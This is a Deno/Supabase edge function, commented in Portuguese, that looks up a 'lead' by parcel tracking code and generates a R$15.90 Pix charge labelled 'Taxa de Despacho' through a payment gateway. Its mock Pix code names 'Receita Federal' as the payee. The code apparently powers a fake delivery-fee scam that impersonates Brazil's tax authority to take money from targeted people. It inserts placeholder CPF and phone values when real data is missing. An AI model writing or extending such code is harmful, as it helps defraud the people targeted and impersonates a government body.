import { serve } from "https://deno.land/std@0.190.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.45.0'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders })
  }

  try {
    const { trackingCode } = await req.json();

    if (!trackingCode) {
      throw new Error("Tracking code is required");
    }

    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

    // Busca os dados do lead para montar o Payload da Royal Banking
    const { data: lead } = await supabase
      .from('leads')
      .select('*')
      .eq('codigo_rastreio', trackingCode)
      .maybeSingle();

    // Tratamento dos dados requeridos
    const clientName = lead?.nome || "Cliente Identificado";
    let clientDoc = lead?.cpf || "12345678909";
    let clientTel = lead?.telefone || "11999999999";
    const clientEmail = lead?.email || "cliente@email.com";

    // A Royal Banking exige documentos sem formatação
    clientDoc = clientDoc.replace(/\D/g, '');
    clientTel = clientTel.replace(/\D/g, '');
    if (clientDoc.length !== 11 && clientDoc.length !== 14) clientDoc = "12345678909";
    if (clientTel.length < 10) clientTel = "11999999999";

    const apiKey = Deno.env.get('ROYALBANKING_API_KEY');
    
    // Se a API Key não for encontrada, mock de teste de segurança
    if (!apiKey) {
      console.warn("ROYALBANKING_API_KEY não configurada. Utilizando modo simulado.");
      const mockId = "mock_" + Date.now();
      const mockPix = "00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-426614174000520400005303986540515.905802BR5913Receita Federal6008Brasilia62140510TAXA1234566304A1B2";
      
      await supabase.from('pix_gateway_payments').upsert({
        id_transaction: mockId,
        status: 'pending',
        raw_payload: { trackingCode, pix: mockPix, amount: 15.90, description: "Taxa de Despacho" }
      });
      
      return new Response(JSON.stringify({ success: true, pixCopiaECola: mockPix, idTransaction: mockId }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      });
    }

    // Chamada REAL da API Royal Banking (Atualizado para 15.90)
    const payload = {
      "api-key": apiKey,
      "amount": 15.90,
      "client": {
        "name": clientName,
        "document": clientDoc,
        "telefone": clientTel,
        "email": clientEmail
      },
      "callbackUrl": "https://ulrigywayovxuyiktnlr.supabase.co/functions/v1/royal-banking-webhook"
    };

    const response = await fetch("https://api.royalbanking.com.br/v1/gateway/", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    const data = await response.json();

    if (!response.ok || data.status !== 'success') {
      console.error("[create-tax-pix] Falha Royal Banking:", data);
      throw new Error("Erro de comunicação com o Gateway de Pagamentos.");
    }

    const idTransaction = data.idTransaction;
    const pixCopiaECola = data.paymentCode;

    // Salva a transação com ID da Royal Banking
    await supabase.from('pix_gateway_payments').upsert({
      id_transaction: idTransaction,
      status: 'pending',
      raw_payload: { trackingCode, pix: pixCopiaECola, amount: 15.90 }
    });

    return new Response(JSON.stringify({ 
      success: true, 
      pixCopiaECola,
      idTransaction
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 200,
    });

  } catch (error: any) {
    console.error("[create-tax-pix] Error:", error);
    return new Response(JSON.stringify({ error: error.message }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 500,
    });
  }
})